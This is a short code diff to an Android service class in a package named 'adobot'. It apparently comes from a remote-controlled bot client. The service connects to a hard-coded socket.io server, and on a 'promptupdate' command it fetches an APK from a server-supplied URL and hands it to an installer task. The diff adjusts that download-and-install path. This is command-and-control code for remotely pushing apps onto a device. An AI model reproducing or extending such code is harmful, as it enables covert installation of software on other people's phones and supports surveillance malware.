@@ -34,6 +34,8 @@ import io.socket.client.IO;
 import io.socket.client.Socket;
 import io.socket.emitter.Emitter;
 
+import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;
+
 
 public class Client extends Service {
 
@@ -41,6 +43,8 @@ public class Client extends Service {
 
     public static final String SERVER = "http://192.168.1.251:3000";
     private static final String POST_STATUS = "/status";
+    public static final String EXTRA_UPDATE_URL = "buddy.ap.com.adobot.UPDATE_URL";
+
     private Client client;
     private Socket socket;
     private boolean connected;
@@ -208,8 +212,9 @@ public class Client extends Service {
                             } else if (command.equals("promptupdate")) {
                                 Log.i(TAG, "\nInvoking UpdateApp\n");
                                 String apkUrl = cmd.get("arg1").toString();
+
                                 UpdateApp atualizaApp = new UpdateApp();
-                                atualizaApp.setContext(getApplicationContext());
+                                atualizaApp.setClient(client);
                                 atualizaApp.execute(apkUrl);
                             }
 
